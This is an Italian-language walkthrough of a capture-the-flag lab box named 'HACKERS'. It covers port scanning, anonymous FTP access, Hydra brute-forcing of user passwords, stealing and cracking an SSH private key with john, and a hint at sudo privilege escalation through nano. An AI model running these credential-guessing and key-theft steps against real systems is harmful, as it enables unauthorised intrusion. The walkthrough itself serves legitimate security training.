## HACKERS
partiamo con uno scan delle porte

### enum

```bash
nmap HACKERS.thm -sV -sC 
```
molto bene... abbiamo tre porte aperte andiamo sulla ftp che accetta connessioni in anonimo

## FTP
```bash
ftp Anonymous@HACKERS.THM
```
ottimo prendiamo il note che hanno lasciato

```bash
get note
```
il file dice che ci sono 2 utenti con delle password scarse 
```bash
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
```

facciamo un file user
```bash
nano user.txt
```
e aggiungiamo rcampbell gcrawford

cosa fare quando le password fanno schifo???

## BRUTE FORCE

ecco qua il programma preferito HYDRA

facciamo il comando 
```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt HACKERS.THM ftp
```

ecco la password a gratis per noi :)

colleghiamoci in ftp con l'utente trovato 

```bash
ftp gcrawford@HACKERS.THM
```
```bash
ls -a
```
ecco la cartella .ssh
```bash
get id_rsa
```

controllando questa id_rsa ha un altra password....

vabbè risolviamo. crackiamola!!
```bash
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt
```
ed ecco la password grazie. colleghiamoci in ssh
```bash
ssh -i id_rsa gcrawford@hackers.thm
```

## privesc

vediamo cosa possiamo fare
```bash
sudo -l
```

OTTIMO ABBIAMO GRANDI POSSIBILITà(guardate gtfo.bins)
(hint: guardate i comandi di nano)

